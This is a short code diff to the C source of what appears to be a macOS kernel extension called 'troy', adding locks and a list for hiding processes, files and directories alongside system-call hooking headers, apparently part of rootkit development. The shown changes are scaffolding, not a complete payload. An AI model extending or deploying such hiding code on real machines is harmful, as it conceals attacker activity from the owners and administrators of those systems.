@@ -19,13 +19,20 @@
 #include "HookSystemCall.h"
 #include "Control.h"
 #include "common.h"
+#include "HookCAPI.h"
 
 kern_return_t troy_start(kmod_info_t * ki, void *d);
 kern_return_t troy_stop(kmod_info_t *ki, void *d);
 
-#pragma make - lock object
+#pragma mark - lock object
 lck_grp_t *lck_grp=NULL;
 lck_grp_attr_t *lck_grp_attr=NULL;
+lck_mtx_t *lck_mtx_hide_process=NULL;
+lck_mtx_t *lck_mtx_hide_file=NULL;
+lck_mtx_t *lck_mtx_hide_directory=NULL;
+
+#pragma mark - TAILQ
+struct hide_proc_list hide_proc_array;  //for store process that is hide
 
 kern_return_t troy_start(kmod_info_t * ki, void *d)
 {
@@ -43,7 +50,7 @@ kern_return_t troy_start(kmod_info_t * ki, void *d)
         goto failed;
     }
 
-
+    TAILQ_INIT(&hide_proc_array);   //init process array that the process is hidden
 //    mach_vm_address_t addr =  getKernelHeader();
 //    if(addr==0)
 //    {
